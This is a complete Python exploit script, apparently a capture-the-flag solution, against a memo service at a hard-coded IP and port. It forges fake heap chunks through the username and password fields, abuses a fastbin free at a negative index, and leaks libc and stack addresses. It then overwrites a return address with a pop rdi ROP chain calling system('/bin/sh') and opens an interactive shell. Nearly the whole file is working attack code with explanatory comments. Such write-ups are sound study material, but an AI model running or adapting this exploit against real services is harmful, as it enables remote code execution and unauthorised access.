#!/usr/bin/python
import socket
import struct
import telnetlib
import sys

host = '54.202.7.144'
port = 8888

if len(sys.argv) > 1:
   host = '192.168.2.170'

p = lambda x: struct.pack('<Q', x)
u = lambda x: struct.unpack('<Q', x)[0]


def readuntil(delim='\n\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def interact():
   print "[*] Spawning Shell [*]"
   s.send("""python -c 'import pty; pty.spawn("/bin/sh")'\n""")
   t = telnetlib.Telnet()
   t.sock = s
   t.interact()

def create_msg(index, size, msg):
    readuntil(">>")
    f.write(1)
    readuntil(":")
    f.write(index)
    readuntil(":")
    f.write(size)
    if size > 32:
        readuntil("though")
    else:
        readuntil(":")
    f.write(msg)

def edit_msg(msg):
    readuntil(">>")
    f.write(2)
    readuntil(":")
    f.write(msg)
    readuntil("\n")
    readuntil("\n")

def view_msg(index):
    readuntil(">>")
    f.write(3)
    readuntil(":")
    f.write(index)
    return readuntil("\n")

def delete_msg(index):
    readuntil(">>")
    f.write(4)
    readuntil(":")
    f.write(index)
    readuntil("\n")

def update_user(username, password, new_password):
   readuntil(">>")
   f.write(5)
   readuntil(":")
   f.write(password)
   readuntil(":")
   f.write(username)
   readuntil(":")
   f.write(new_password + "\n")
   readuntil("\n")

def set_user(username, password):
    readuntil(":")
    f.write(username)
    readuntil("(y/n")
    f.write("y\n")
    readuntil(":")
    f.write(password)

def get_address(msg):
    data = msg.split(":")[1][1:-1]
    return u(data.ljust(8, '\0'))

if __name__ == '__main__':
   
   s = socket.create_connection((host,port))
   f = s.makefile('rw', bufsize=0)
   
   # setup username and password to be 2 fake heap chunks, each with size 0x30
   username = p(0) + p(0x30) + p(0x602a30) + p(0)
   password = p(0) + p(0) + p(0) + p(0x30)
   new_pass = password
   set_user(username, password)

   # init memory with a malloc
   create_msg(3, 32, "msg3") 

   # free the fake chunk at address 0x602a30, and put it into fastbin
   delete_msg(-8) 

   # update freed chunk 0x602a30's FD ptr to be 0x602a50
   username = p(0) + p(0x30) + p(0x602a50) +p(0) 
   update_user(username, password, new_pass)
   
   got_atoi = 0x601ff0

   # this address was identified while looking into the heap memory space
   # with GDB
   stack_leak = 0x602ab0

   # malloc returns 0x602a30 for this create memo
   create_msg(0, 32, p(0) * 4) 

   # malloc returns 0x602a60 for this create memo
   # overwrite the 4 entries in memo size table with 0x30 
   # overwrite memo table's 0th entry with the address of GOT atoi
   create_msg(1, 32, p(0x0000003000000030) * 2 + p(got_atoi))

   libc_atoi = get_address(view_msg(0))
   print "libc@atoi: ", hex(libc_atoi)

   offset_atoi = 0x36c80
   offset_system = 0x44380
   offset_str_bin_sh = 0x18c385

   libc_base = libc_atoi - offset_atoi
   libc_system = libc_base + offset_system
   libc_str_bin_sh = libc_base + offset_str_bin_sh

   print "libc@system: ", hex(libc_system)
   print "libc@str_bin_sh: ", hex(libc_str_bin_sh)
  
   # overwrite the 4 entries in memo size table with 0x30
   # overwrite memo table's 0th entry with the heap address that 
   # stored stack address
   edit_msg(p(0x0000003000000030) * 2 + p(stack_leak))
   
   rsp = get_address(view_msg(0))
   print "rsp: ", hex(rsp)
   rbp = rsp + 0x10
   print "rbp: ", hex(rbp)
   ret = rbp + 0x8
   print "ret: ", hex(ret)

   # clear out memo's table 0th and 1st entry
   edit_msg(p(0x0000003000000030) * 2 + p(0) * 2)

   # setup username and password to be 2 fake chunks, each with size 0x30
   username = p(0) + p(0x30) + p(0x602a30) + p(0)
   update_user(username, password, new_pass)

   # free the fake chunk at address 0x602a30, and put into fastbin again
   delete_msg(-8) 

   # update freed chunk 0x602a30's FD ptr to be 0x602a50
   username = p(0) + p(0x30) + p(0x602a50) + p(0) 
   update_user(username, password, new_pass)

   # malloc returns 0x602a30 for this create memo
   create_msg(1, 33, p(0) * 4) 

   # malloc returns 0x602a60 for this create memo
   # we overwrite the 0th entry memo with the address of the stack's frame RET
   create_msg(0, 33, p(0x0000003000000030) * 2  + p(ret))

   # gadget: pop rdi ; ret
   pop_rdi = 0x401263 

   # edit the stack's frame RET so it will execute a pop rdi instruction
   # this will load the address of string "/bin/sh" into rdi register
   # next, 'ret' into the address of libc system(); 
   # this essentially does system("/bin/sh"); in x86_64
   edit_msg(p(pop_rdi) + p(libc_str_bin_sh) + p(libc_system))

   # sh3ll
   interact()
